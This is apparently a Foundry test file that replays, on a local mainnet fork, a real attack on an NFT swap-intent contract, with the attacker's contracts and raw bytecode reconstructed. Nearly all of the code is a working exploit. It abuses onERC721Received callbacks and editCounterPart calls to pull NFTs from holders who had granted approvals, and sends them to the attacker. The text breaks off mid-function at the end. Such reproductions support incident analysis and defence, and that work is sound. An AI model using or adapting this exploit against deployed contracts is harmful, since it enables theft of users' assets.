// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d
// https://etherscan.io/address/0xb1EdF2a0BA8Bc789cBc3DFbe519737cAdA034D2D

struct S1 {
    address p1;
    address p2;
    uint24 p3;
    int24 p4;
    int24 p5;
    uint256 p6;
    uint256 p7;
    uint256 p8;
    uint256 p9;
    address p10;
    uint256 p11;
}

struct S3 {
    address p1;
    address p2;
    uint256[] p3;
    uint256[] p4;
    bytes p5;
}

struct S2 {
    uint256 p1;
    address p2;
    uint256 p3;
    address p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    uint256 p8;
    uint8 p9;
}

interface I {
    function setApprovalForAll(address, bool) external payable;
    function createSwapIntent(S2 memory, S3[] memory, S3[] memory) external payable;
    function closeSwapIntent(address, uint256) external payable;
    function mint(S1 memory) external payable;
    function editCounterPart(uint256, address) external payable;
    function balanceOf(address) external payable returns (uint256);
    function isApprovedForAll(address, address) external payable;
    function tokenOfOwnerByIndex(address, uint256) external payable;
    function safeTransferFrom(address, address, uint256) external payable;
}

contract X871f is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d");
    }

    address constant x0000 = 0x0000000000000000000000000000000000000000;
    address constant x074f = 0x074F366e9AefCbD32444953728C82Fb1d173144F;
    address constant x2393 = 0x23938954BC875bb8309AEF15e2Dead54884B73Db;
    address constant x49cf = 0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B;
    address constant x5887 = 0x58874d2951524F7f851bbBE240f0C3cF0b992d79;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xc310 = 0xC310e760778ECBca4C65B6C559874757A4c4Ece0;
    address constant xc364 = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address constant xe16c = 0xe16Ca6B8addC5D51341ebB6d8dAef8eF36AE4621;
    address constant xed5a = 0xED5AF388653567Af2F388E6224dC7C4b3241C544;

    address x378f;

    uint256 t_x64882c9f = 0;
    uint256 t_onERC721Received = 0;

    function test1() public {
        // vm.startPrank(0xb1EdF2a0BA8Bc789cBc3DFbe519737cAdA034D2D, 0xb1EdF2a0BA8Bc789cBc3DFbe519737cAdA034D2D);

        vm.createSelectFork("http://localhost:18545", 18799487); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x7a9e2526781245648aeca4f6d23b0079e6b6ee1376e8e2c628b3813a65dc7843));

        // https://explorer.phalcon.xyz/tx/eth/0x7a9e2526781245648aeca4f6d23b0079e6b6ee1376e8e2c628b3813a65dc7843
        this.x7a9e2526();
        // https://explorer.phalcon.xyz/tx/eth/0x256c4b81817f7323cb9386395db5dfd1b7394dcc72d34a277b7b27c2d3a7db20
        this.x256c4b81();
        // https://explorer.phalcon.xyz/tx/eth/0x5d66c337899d913ff7d6deb34ababa9fbaed28e28ee05cd5da07d076f9f1e569
        this.x5d66c337();
        // https://explorer.phalcon.xyz/tx/eth/0xc9a308500e8a585d21decbfdf9dea9cd63787c541aec4c448634332beba49f5a
        this.xc9a30850();
        // https://explorer.phalcon.xyz/tx/eth/0x42eddcf2122cced63f1a62666a11a1b4d7a5b495696e9eec84763e560d1926cf
        this.x42eddcf2();
        // https://explorer.phalcon.xyz/tx/eth/0xb371e5bc837ec93aea11ab18cfccdfc9420c323a0fe234ed56fda218ef650676
        this.xb371e5bc();
        // https://explorer.phalcon.xyz/tx/eth/0x319c2600ff1eb17e8ffeccab5b52f72eed3c89a59dbf0274147733a57cc32585
        this.x319c2600();
        // https://explorer.phalcon.xyz/tx/eth/0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d
        x64882c9f();
    }

    function test2() public {
        // vm.startPrank(0xb1EdF2a0BA8Bc789cBc3DFbe519737cAdA034D2D, 0xb1EdF2a0BA8Bc789cBc3DFbe519737cAdA034D2D);

        vm.createSelectFork("http://localhost:18545", 18799307); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x7a9e2526781245648aeca4f6d23b0079e6b6ee1376e8e2c628b3813a65dc7843
        this.x7a9e2526();
        vm.warp(1702738019);
        vm.roll(18799308);
        // https://explorer.phalcon.xyz/tx/eth/0x256c4b81817f7323cb9386395db5dfd1b7394dcc72d34a277b7b27c2d3a7db20
        this.x256c4b81();
        vm.warp(1702738391);
        vm.roll(18799339);
        // https://explorer.phalcon.xyz/tx/eth/0x5d66c337899d913ff7d6deb34ababa9fbaed28e28ee05cd5da07d076f9f1e569
        this.x5d66c337();
        vm.warp(1702739219);
        vm.roll(18799408);
        // https://explorer.phalcon.xyz/tx/eth/0xc9a308500e8a585d21decbfdf9dea9cd63787c541aec4c448634332beba49f5a
        this.xc9a30850();
        vm.warp(1702739279);
        vm.roll(18799413);
        // https://explorer.phalcon.xyz/tx/eth/0x42eddcf2122cced63f1a62666a11a1b4d7a5b495696e9eec84763e560d1926cf
        this.x42eddcf2();
        vm.warp(1702739291);
        vm.roll(18799414);
        // https://explorer.phalcon.xyz/tx/eth/0xb371e5bc837ec93aea11ab18cfccdfc9420c323a0fe234ed56fda218ef650676
        this.xb371e5bc();
        vm.warp(1702739543);
        vm.roll(18799435);
        // https://explorer.phalcon.xyz/tx/eth/0x319c2600ff1eb17e8ffeccab5b52f72eed3c89a59dbf0274147733a57cc32585
        this.x319c2600();
        vm.warp(1702740179);
        vm.roll(18799487);
        // https://explorer.phalcon.xyz/tx/eth/0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d
        x64882c9f();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 18799487); // tx.blockNumber - 1

        vm.warp(1702740179);
        vm.roll(18799488);
        // https://explorer.phalcon.xyz/tx/eth/0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d
        x64882c9f();
    }

    function x64882c9f() public payable {
        t_x64882c9f++;

        if (t_x64882c9f == 1) {
            I(xc364).setApprovalForAll(x49cf, true);
            I(xed5a).isApprovedForAll(xe16c, x49cf);
            return;
        }
        if (t_x64882c9f == 2) {
            I(xc364).setApprovalForAll(xc310, true);
            I(x49cf).isApprovedForAll(x2393, xc310);

            S2 memory s202 = S2(0, x0000, 0, r, 0, 0, 0, 0, 0);
            S3[] memory arr07 = new S3[](0);
            uint256[] memory arr09 = new uint256[](1);
            arr09[0] = 625712;
            uint256[] memory arr10 = new uint256[](0);
            bytes memory b08 = abi.encode(xc310, x2393, 10351);
            S3 memory s303 = S3(xc364, x5887, arr09, arr10, b08);
            uint256[] memory arr11 = new uint256[](1);
            arr11[0] = 6670;
            uint256[] memory arr12 = new uint256[](0);
            S3 memory s304 = S3(x49cf, x5887, arr11, arr12, "");
            S3[] memory arr08 = new S3[](2);
            arr08[0] = s303;
            arr08[1] = s304;
            I(xc310).createSwapIntent{value: 5000000000000000}(s202, arr07, arr08);

            I(xc310).closeSwapIntent{value: 5000000000000000}(r, 10351);
            I(x49cf).safeTransferFrom(r, tx.origin, 6670);

            S2 memory s203 = S2(0, x0000, 0, r, 0, 0, 0, 0, 0);
            S3[] memory arr13 = new S3[](0);
            uint256[] memory arr15 = new uint256[](1);
            arr15[0] = 625712;
            uint256[] memory arr16 = new uint256[](0);
            bytes memory b11 = abi.encode(xc310, x2393, 10352);
            S3 memory s305 = S3(xc364, x5887, arr15, arr16, b11);
            uint256[] memory arr17 = new uint256[](1);
            arr17[0] = 6650;
            uint256[] memory arr18 = new uint256[](0);
            S3 memory s306 = S3(x49cf, x5887, arr17, arr18, "");
            S3[] memory arr14 = new S3[](2);
            arr14[0] = s305;
            arr14[1] = s306;
            I(xc310).createSwapIntent{value: 5000000000000000}(s203, arr13, arr14);

            I(xc310).closeSwapIntent{value: 5000000000000000}(r, 10352);
            I(x49cf).safeTransferFrom(r, tx.origin, 6650);

            S2 memory s204 = S2(0, x0000, 0, r, 0, 0, 0, 0, 0);
            S3[] memory arr19 = new S3[](0);
            uint256[] memory arr21 = new uint256[](1);
            arr21[0] = 625712;
            uint256[] memory arr22 = new uint256[](0);
            bytes memory b14 = abi.encode(xc310, x2393, 10353);
            S3 memory s307 = S3(xc364, x5887, arr21, arr22, b14);
            uint256[] memory arr23 = new uint256[](1);
            arr23[0] = 4843;
            uint256[] memory arr24 = new uint256[](0);
            S3 memory s308 = S3(x49cf, x5887, arr23, arr24, "");
            S3[] memory arr20 = new S3[](2);
            arr20[0] = s307;
            arr20[1] = s308;
            I(xc310).createSwapIntent{value: 5000000000000000}(s204, arr19, arr20);

            I(xc310).closeSwapIntent{value: 5000000000000000}(r, 10353);
            I(x49cf).safeTransferFrom(r, tx.origin, 4843);

            S2 memory s205 = S2(0, x0000, 0, r, 0, 0, 0, 0, 0);
            S3[] memory arr25 = new S3[](0);
            uint256[] memory arr27 = new uint256[](1);
            arr27[0] = 625712;
            uint256[] memory arr28 = new uint256[](0);
            bytes memory b17 = abi.encode(xc310, x2393, 10354);
            S3 memory s309 = S3(xc364, x5887, arr27, arr28, b17);
            uint256[] memory arr29 = new uint256[](1);
            arr29[0] = 5432;
            uint256[] memory arr30 = new uint256[](0);
            S3 memory s310 = S3(x49cf, x5887, arr29, arr30, "");
            S3[] memory arr26 = new S3[](2);
            arr26[0] = s309;
            arr26[1] = s310;
            I(xc310).createSwapIntent{value: 5000000000000000}(s205, arr25, arr26);

            I(xc310).closeSwapIntent{value: 5000000000000000}(r, 10354);
            I(x49cf).safeTransferFrom(r, tx.origin, 5432);

            S2 memory s206 = S2(0, x0000, 0, r, 0, 0, 0, 0, 0);
            S3[] memory arr31 = new S3[](0);
            uint256[] memory arr33 = new uint256[](1);
            arr33[0] = 625712;
            uint256[] memory arr34 = new uint256[](0);
            bytes memory b20 = abi.encode(xc310, x2393, 10355);
            S3 memory s311 = S3(xc364, x5887, arr33, arr34, b20);
            uint256[] memory arr35 = new uint256[](1);
            arr35[0] = 9870;
            uint256[] memory arr36 = new uint256[](0);
            S3 memory s312 = S3(x49cf, x5887, arr35, arr36, "");
            S3[] memory arr32 = new S3[](2);
            arr32[0] = s311;
            arr32[1] = s312;
            I(xc310).createSwapIntent{value: 5000000000000000}(s206, arr31, arr32);

            I(xc310).closeSwapIntent{value: 5000000000000000}(r, 10355);
            I(x49cf).safeTransferFrom(r, tx.origin, 9870);
            I(xc364).setApprovalForAll(xc310, false);
            return;
        }
    }

    function xb371e5bc() public {
        r.call{value: 1000000000000000}(hex"f1fe9587");
    }

    function xc9a30850() public {
        X378f(payable(x378f)).withdraw(x0000);
    }

    function x7a9e2526() public {
        x378f = address(new X378f());
    }

    function x5d66c337() public {
        x378f.call{value: 100000000000000000}(abi.encodeWithSelector(0xecadf14b, xc310, xed5a, 10345, 128, 1, x074f));
    }

    function x256c4b81() public {
        x378f.call{value: 1000000000000000}(hex"f1fe9587");
    }

    function x42eddcf2() public {
        _constructor_();
    }

    function x319c2600() public {
        r.call{value: 100000000000000000}(
            abi.encodeWithSelector(0x64882c9f, x49cf, xed5a, 10348, xe16c, 160, 3, 15449, 1548, 13934)
        );
    }

    function _constructor_() public {
        bytes memory rt =
            hex"6080604052600436106100435760003560e01c8063150b7a021461004f57806351cff8d91461008c57806364882c9f146100b5578063f1fe9587146100d15761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b5061007660048036038101906100719190610e6d565b6100db565b6040516100839190610f30565b60405180910390f35b34801561009857600080fd5b506100b360048036038101906100ae9190610f4b565b6101c7565b005b6100cf60048036038101906100ca91906110c7565b6103c1565b005b6100d9610b16565b005b6000600260009054906101000a900460ff16156101b4576000808484810190610104919061119c565b925092505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cf14e55782846040518363ffffffff1660e01b815260040161016492919061120d565b600060405180830381600087803b15801561017e57600080fd5b505af1158015610192573d6000803e3d6000fd5b505050506000600260006101000a81548160ff02191690831515021790555050505b63150b7a0260e01b905095945050505050565b6040516020016101d6906112d9565b6040516020818303038152906040526101ee90611340565b326040516020016101ff91906113ef565b60405160208183030381529060405280519060200120604051602001610225919061142b565b604051602081830303815290604052805190602001201461024557600080fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036102c5573373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156102bf573d6000803e3d6000fd5b506103be565b8073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb338373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161031b9190611446565b602060405180830381865afa158015610338573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061035c9190611476565b6040518363ffffffff1660e01b81526004016103799291906114a3565b6020604051808303816000875af1158015610398573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103bc9190611504565b505b50565b6040516020016103d0906112d9565b6040516020818303038152906040526103e890611340565b326040516020016103f991906113ef565b6040516020818303038152906040528051906020012060405160200161041f919061142b565b604051602081830303815290604052805190602001201461043f57600080fd5b6060856000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073c36442b4a4522e871399cd717abdd847ab11fe8873ffffffffffffffffffffffffffffffffffffffff1663a22cb4658760016040518363ffffffff1660e01b81526004016104d1929190611540565b600060405180830381600087803b1580156104eb57600080fd5b505af11580156104ff573d6000803e3d6000fd5b50505050600015158573ffffffffffffffffffffffffffffffffffffffff1663e985e9c585896040518363ffffffff1660e01b8152600401610542929190611569565b602060405180830381865afa15801561055f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105839190611504565b1515036105905750610b0f565b60005b8251811015610a8a57600060405180610120016040528060008152602001600073ffffffffffffffffffffffffffffffffffffffff168152602001600081526020013073ffffffffffffffffffffffffffffffffffffffff168152602001600081526020016000815260200160008152602001600081526020016000600281111561062157610620611592565b5b81525090506000600167ffffffffffffffff81111561064357610642610f89565b5b6040519080825280602002602001820160405280156106715781602001602082028036833780820191505090505b5090506001548160008151811061068b5761068a6115c1565b5b60200260200101818152505060008987896040516020016106ae939291906115f0565b604051602081830303815290604052905060606000600167ffffffffffffffff8111156106de576106dd610f89565b5b60405190808252806020026020018201604052801561070c5781602001602082028036833780820191505090505b509050878681518110610722576107216115c1565b5b60200260200101518160008151811061073e5761073d6115c1565b5b6020026020010181815250506000600267ffffffffffffffff81111561076757610766610f89565b5b6040519080825280602002602001820160405280156107a057816020015b61078d610d05565b8152602001906001900390816107855790505b5090506040518060a0016040528073c36442b4a4522e871399cd717abdd847ab11fe8873ffffffffffffffffffffffffffffffffffffffff1681526020017358874d2951524f7f851bbbe240f0c3cf0b992d7973ffffffffffffffffffffffffffffffffffffffff1681526020018681526020018981526020018581525081600081518110610832576108316115c1565b5b60200260200101819052506040518060a001604052808d73ffffffffffffffffffffffffffffffffffffffff1681526020017358874d2951524f7f851bbbe240f0c3cf0b992d7973ffffffffffffffffffffffffffffffffffffffff16815260200183815260200189815260200160405180602001604052806000815250815250816001815181106108c7576108c66115c1565b5b60200260200101819052508c73ffffffffffffffffffffffffffffffffffffffff1663c041abb16611c37937e080008886856040518563ffffffff1660e01b8152600401610917939291906119ad565b6000604051808303818588803b15801561093057600080fd5b505af1158015610944573d6000803e3d6000fd5b50505050506001600260006101000a81548160ff0219169083151502179055508c73ffffffffffffffffffffffffffffffffffffffff1663e7b061e86611c37937e08000308e6040518463ffffffff1660e01b81526004016109a79291906114a3565b6000604051808303818588803b1580156109c057600080fd5b505af11580156109d4573d6000803e3d6000fd5b50505050508b73ffffffffffffffffffffffffffffffffffffffff166342842e0e30328c8b81518110610a0a57610a096115c1565b5b60200260200101516040518463ffffffff1660e01b8152600401610a30939291906115f0565b600060405180830381600087803b158015610a4a57600080fd5b505af1158015610a5e573d6000803e3d6000fd5b5050505060018b610a6f9190611a24565b9a505050505050508080610a8290611a58565b915050610593565b5073c36442b4a4522e871399cd717abdd847ab11fe8873ffffffffffffffffffffffffffffffffffffffff1663a22cb4658760006040518363ffffffff1660e01b8152600401610adb929190611540565b600060405180830381600087803b158015610af557600080fd5b505af1158015610b09573d6000803e3d6000fd5b50505050505b5050505050565b604051602001610b25906112d9565b604051602081830303815290604052610b3d90611340565b32604051602001610b4e91906113ef565b60405160208183030381529060405280519060200120604051602001610b74919061142b565b6040516020818303038152906040528051906020012014610b9457600080fd5b600060405180610160016040528073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4873ffffffffffffffffffffffffffffffffffffffff16815260200173c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1681526020016101f462ffffff168152602001600060020b8152602001620186a060020b81526020016000815260200134815260200160008152602001600081526020013073ffffffffffffffffffffffffffffffffffffffff168152602001428152509050600073c36442b4a4522e871399cd717abdd847ab11fe8873ffffffffffffffffffffffffffffffffffffffff16638831645634846040518363ffffffff1660e01b8152600401610cb29190611bbb565b60806040518083038185885af1158015610cd0573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190610cf59190611c1f565b5050509050806001819055505050565b6040518060a00160405280600073ffffffffffffffffffffffffffffffffffffffff168152602001600073ffffffffffffffffffffffffffffffffffffffff1681526020016060815260200160608152602001606081525090565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610d9f82610d74565b9050919050565b610daf81610d94565b8114610dba57600080fd5b50565b600081359050610dcc81610da6565b92915050565b6000819050919050565b610de581610dd2565b8114610df057600080fd5b50565b600081359050610e0281610ddc565b92915050565b600080fd5b600080fd5b600080fd5b60008083601f840112610e2d57610e2c610e08565b5b8235905067ffffffffffffffff811115610e4a57610e49610e0d565b5b602083019150836001820283011115610e6657610e65610e12565b5b9250929050565b600080600080600060808688031215610e8957610e88610d6a565b5b6000610e9788828901610dbd565b9550506020610ea888828901610dbd565b9450506040610eb988828901610df3565b935050606086013567ffffffffffffffff811115610eda57610ed9610d6f565b5b610ee688828901610e17565b92509250509295509295909350565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b610f2a81610ef5565b82525050565b6000602082019050610f456000830184610f21565b92915050565b600060208284031215610f6157610f60610d6a565b5b6000610f6f84828501610dbd565b91505092915050565b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b610fc182610f78565b810181811067ffffffffffffffff82111715610fe057610fdf610f89565b5b80604052505050565b6000610ff3610d60565b9050610fff8282610fb8565b919050565b600067ffffffffffffffff82111561101f5761101e610f89565b5b602082029050602081019050919050565b600061104361103e84611004565b610fe9565b9050808382526020820190506020840283018581111561106657611065610e12565b5b835b8181101561108f578061107b8882610df3565b845260208401935050602081019050611068565b5050509392505050565b600082601f8301126110ae576110ad610e08565b5b81356110be848260208601611030565b91505092915050565b600080600080600060a086880312156110e3576110e2610d6a565b5b60006110f188828901610dbd565b955050602061110288828901610dbd565b945050604061111388828901610df3565b935050606061112488828901610dbd565b925050608086013567ffffffffffffffff81111561114557611144610d6f565b5b61115188828901611099565b9150509295509295909350565b600061116982610d74565b9050919050565b6111798161115e565b811461118457600080fd5b50565b60008135905061119681611170565b92915050565b6000806000606084860312156111b5576111b4610d6a565b5b60006111c386828701611187565b93505060206111d486828701611187565b92505060406111e586828701610df3565b9150509250925092565b6111f881610dd2565b82525050565b61120781610d94565b82525050565b600060408201905061122260008301856111ef565b61122f60208301846111fe565b9392505050565b600081905092915050565b7f3200000000000000000000000000000000000000000000000000000000000000600082015250565b6000611277600183611236565b915061128282611241565b600182019050919050565b7f16e8b67ee8a14edbb77abfd4581e022c1f33da7ec7b8e8927b9a94eb40652900600082015250565b60006112c3601f83611236565b91506112ce8261128d565b601f82019050919050565b60006112e48261126a565b91506112ef826112b6565b9150819050919050565b600081519050919050565b6000819050602082019050919050565b6000819050919050565b600061132a8251611314565b80915050919050565b600082821b905092915050565b600061134b826112f9565b8261135584611304565b90506113608161131e565b925060208210156113a05761139b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff83602003600802611333565b831692505b5050919050565b60008160601b9050919050565b60006113bf826113a7565b9050919050565b60006113d1826113b4565b9050919050565b6113e96113e482610d94565b6113c6565b82525050565b60006113fb82846113d8565b60148201915081905092915050565b6000819050919050565b61142561142082611314565b61140a565b82525050565b60006114378284611414565b60208201915081905092915050565b600060208201905061145b60008301846111fe565b92915050565b60008151905061147081610ddc565b92915050565b60006020828403121561148c5761148b610d6a565b5b600061149a84828501611461565b91505092915050565b60006040820190506114b860008301856111fe565b6114c560208301846111ef565b9392505050565b60008115159050919050565b6114e1816114cc565b81146114ec57600080fd5b50565b6000815190506114fe816114d8565b92915050565b60006020828403121561151a57611519610d6a565b5b6000611528848285016114ef565b91505092915050565b61153a816114cc565b82525050565b600060408201905061155560008301856111fe565b6115626020830184611531565b9392505050565b600060408201905061157e60008301856111fe565b61158b60208301846111fe565b9392505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600060608201905061160560008301866111fe565b61161260208301856111fe565b61161f60408301846111ef565b949350505050565b61163081610dd2565b82525050565b61163f81610d94565b82525050565b6003811061165657611655611592565b5b50565b600081905061166782611645565b919050565b600061167782611659565b9050919050565b6116878161166c565b82525050565b610120820160008201516116a46000850182611627565b5060208201516116b76020850182611636565b5060408201516116ca6040850182611627565b5060608201516116dd6060850182611636565b5060808201516116f06080850182611627565b5060a082015161170360a0850182611627565b5060c082015161171660c0850182611627565b5060e082015161172960e0850182611627565b5061010082015161173e61010085018261167e565b50505050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b60006117a88383611627565b60208301905092915050565b6000602082019050919050565b60006117cc82611770565b6117d6818561177b565b93506117e18361178c565b8060005b838110156118125781516117f9888261179c565b9750611804836117b4565b9250506001810190506117e5565b5085935050505092915050565b600082825260208201905092915050565b60005b8381101561184e578082015181840152602081019050611833565b60008484015250505050565b6000611865826112f9565b61186f818561181f565b935061187f818560208601611830565b61188881610f78565b840191505092915050565b600060a0830160008301516118ab6000860182611636565b5060208301516118be6020860182611636565b50604083015184820360408601526118d682826117c1565b915050606083015184820360608601526118f082826117c1565b9150506080830151848203608086015261190a828261185a565b9150508091505092915050565b60006119238383611893565b905092915050565b6000602082019050919050565b600061194382611744565b61194d818561174f565b93508360208202850161195f85611760565b8060005b8581101561199b578484038952815161197c8582611917565b94506119878361192b565b925060208a01995050600181019050611963565b50829750879550505050505092915050565b6000610160820190506119c3600083018661168d565b8181036101208301526119d68185611938565b90508181036101408301526119eb8184611938565b9050949350505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000611a2f82610dd2565b9150611a3a83610dd2565b9250828201905080821115611a5257611a516119f5565b5b92915050565b6000611a6382610dd2565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203611a9557611a946119f5565b5b600182019050919050565b600062ffffff82169050919050565b611ab881611aa0565b82525050565b60008160020b9050919050565b611ad481611abe565b82525050565b61016082016000820151611af16000850182611636565b506020820151611b046020850182611636565b506040820151611b176040850182611aaf565b506060820151611b2a6060850182611acb565b506080820151611b3d6080850182611acb565b5060a0820151611b5060a0850182611627565b5060c0820151611b6360c0850182611627565b5060e0820151611b7660e0850182611627565b50610100820151611b8b610100850182611627565b50610120820151611ba0610120850182611636565b50610140820151611bb5610140850182611627565b50505050565b600061016082019050611bd16000830184611ada565b92915050565b60006fffffffffffffffffffffffffffffffff82169050919050565b611bfc81611bd7565b8114611c0757600080fd5b50565b600081519050611c1981611bf3565b92915050565b60008060008060808587031215611c3957611c38610d6a565b5b6000611c4787828801611461565b9450506020611c5887828801611c0a565b9350506040611c6987828801611461565b9250506060611c7a87828801611461565b9150509295919450925056fea2646970667358221220f362314db2129050a0bdd4281a2c21e07e7c85e3410507dd40a0ca3424fa7ee864736f6c63430008120033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public {
        t_onERC721Received++;

        if (t_onERC721Received == 1) {
            I(xc310).editCounterPart(10351, x2393);

            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 2) {
            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 3) {
            I(xc310).editCounterPart(10352, x2393);

            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 4) {
            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 5) {
            I(xc310).editCounterPart(10353, x2393);

            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 6) {
            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 7) {
            I(xc310).editCounterPart(10354, x2393);

            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 8) {
            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 9) {
            I(xc310).editCounterPart(10355, x2393);

            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 10) {
            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function xf1fe9587() public payable {
        S1 memory s102 = S1(xa0b8, xc02a, 500, 0, 100000, 0, 1000000000000000, 0, 0, r, 1702739291);
        I(xc364).mint{value: 1000000000000000}(s102);
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x64882c9f) {
            x64882c9f();
            return;
        }
        if (selector == 0xf1fe9587) {
            xf1fe9587();
            return;
        }
        revert("no such function");
    }
}

contract X378f {
    address immutable r = address(this);
    receive() external payable {}
    address constant x0000 = 0x0000000000000000000000000000000000000000;
    address constant x074f = 0x074F366e9AefCbD32444953728C82Fb1d173144F;
    address constant x5887 = 0x58874d2951524F7f851bbBE240f0C3cF0b992d79;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xc310 = 0xC310e760778ECBca4C65B6C559874757A4c4Ece0;
    address constant xc364 = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address constant xed5a = 0xED5AF388653567Af2F388E6224dC7C4b3241C544;

    uint256 t_onERC721Received = 0;

    constructor() payable {}

    function onERC721Received(address, address, uint256, bytes memory) public {
        t_onERC721Received++;

        if (t_onERC721Received == 1) {
            I(xc310).editCounterPart(10345, x074f);

            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_onERC721Received == 2) {
            bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function xecadf14b() public payable {
        I(xc364).setApprovalForAll(xc310, true);
        I(xed5a).isApprovedForAll(x074f, xc310);
        // uint256 v1 = 1;
        uint256 v1 = I(xed5a).balanceOf(x074f);
        console2.log("I(xed5a).balanceOf(x074f)\t->", uint256(1));
        I(xed5a).tokenOfOwnerByIndex(x074f, 0);

        S2 memory s201 = S2(0, x0000, 0, r, 0, 0, 0, 0, 0);
        S3[] memory arr01 = new S3[](0);
        uint256[] memory arr03 = new uint256[](1);
        arr03[0] = 625702;
        uint256[] memory arr04 = new uint256[](0);
        bytes memory b03 = abi.encode(xc310, x074f, 10345);
        S3 memory s301 = S3(xc364, x5887, arr03, arr04, b03);
        uint256[] memory arr05 = new uint256[](1);
        arr05[0] = 7230;
        uint256[] memory arr06 = new uint256[](0);
        S3 memory s302 = S3(xed5a, x5887, arr05, arr06, "");
        S3[] memory arr02 = new S3[](2);
        arr02[0] = s301;
        arr02[1] = s302;
        I(xc310).createSwapIntent{value: 5000000000000000}(s201, arr01, arr02);

        I(xc310).closeSwapIntent{value: 5000000000000000}(r, 10345);
        I(xed5a).safeTransferFrom(r, tx.origin, 7230);
        I(xc364).setApprovalForAll(xc310, false);
    }

    function xf1fe9587() public payable {
        S1 memory s101 = S1(xa0b8, xc02a, 500, 0, 100000, 0, 1000000000000000, 0, 0, r, 1702738019);
        I(xc364).mint{value: 1000000000000000}(s101);
    }

    function withdraw(address) public {
        address(tx.origin).call{value: 90000000000000000}("");
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0xecadf14b) {
